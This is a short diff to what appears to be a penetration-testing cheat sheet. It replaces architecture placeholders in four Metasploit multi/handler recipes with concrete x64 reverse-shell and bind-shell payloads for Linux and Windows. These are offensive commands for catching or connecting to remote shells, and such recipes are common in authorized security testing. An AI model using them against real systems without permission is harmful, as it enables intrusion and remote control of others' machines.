@@ -43,7 +43,7 @@ msf exploit(multi/handler) > run -j
 ```
 msf > use exploit/multi/handler
 
-msf exploit(multi/handler) > set payload linux/<x86 | x64>/shell_reverse_tcp
+msf exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp
 
 msf exploit(multi/handler) > set lhost <IP>
 
@@ -57,7 +57,7 @@ msf exploit(multi/handler) > run -j
 ```
 msf > use exploit/multi/handler
 
-msf exploit(multi/handler) > set payload linux/<x86 | x64>/shell_bind_tcp
+msf exploit(multi/handler) > set payload linux/x64/shell_bind_tcp
 
 msf exploit(multi/handler) > set rhost <target_IP>
 
@@ -73,7 +73,7 @@ msf exploit(multi/handler) > run -j
 ```
 msf > use exploit/multi/handler
 
-msf exploit(multi/handler) > set payload windows/[x64/]shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
 
 msf exploit(multi/handler) > set lhost <IP>
 
@@ -87,7 +87,7 @@ msf exploit(multi/handler) > run -j
 ```
 msf > use exploit/multi/handler
 
-msf exploit(multi/handler) > set payload windows/[x64/]shell_bind_tcp
+msf exploit(multi/handler) > set payload windows/x64/shell_bind_tcp
 
 msf exploit(multi/handler) > set rhost <target_IP>
 
